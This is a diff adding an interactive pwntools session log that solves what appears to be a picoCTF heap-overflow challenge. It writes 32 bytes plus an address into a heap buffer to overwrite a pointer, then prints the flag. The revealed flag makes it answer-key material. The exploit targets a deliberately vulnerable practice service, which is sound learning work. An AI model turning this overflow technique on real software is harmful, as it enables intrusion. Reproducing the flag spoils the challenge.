@@ -1,0 +1,25 @@
+>>>from pwn import *
+>>> p = remote('mimas.picoctf.net', 53695)
+[x] Opening connection to mimas.picoctf.net on port 53695
+[x] Opening connection to mimas.picoctf.net on port 53695: Trying 52.15.88.75
+[+] Opening connection to mimas.picoctf.net on port 53695: Done
+>>> p.recv()
+b'\nI have a function, I sometimes like to call it, maybe you should change it\n\n1. Print Heap\n2. Write to buffer\n3. Print x\n4. Print Flag\n5. Exit\n\nEnter your choice: '
+>>> p.send(b'2\n')
+>>> p.recv()
+b'Data for buffer: '
+>>> p.send(b'a'*32 + b'\xa0\x11\x00\x00\x00\x00\x00\n')
+>>> p.recv()
+b'\n1. Print Heap\n2. Write to buffer\n3. Print x\n4. Print Flag\n5. Exit\n\nEnter your choice: '
+>>> p.send(b'3\n')
+>>> p.recv()
+b'\n\nx = \xa0\x11\n\n\n1. Print Heap\n2. Write to buffer\n3. Print x\n4. Print Flag\n5. Exit\n\nEnter your choice: '
+>>> p.send(b'2\n')
+>>> p.send(b'a'*32 + b'\xa0\x11@\x00\x00\x00\x00\x00\n')
+>>> p.recv()
+b'\n\nx = \xa0\x11@\n\n\n1. Print Heap\n2. Write to buffer\n3. Print x\n4. Print Flag\n5. Exit\n\nEnter your choice: '
+>>> p.send(b'4\n')
+>>> p.recv()
+b'picoCTF{and_down_the_road_we_go_904e3edd}\n'
+
+// Not sure if this is heap3 or heap4
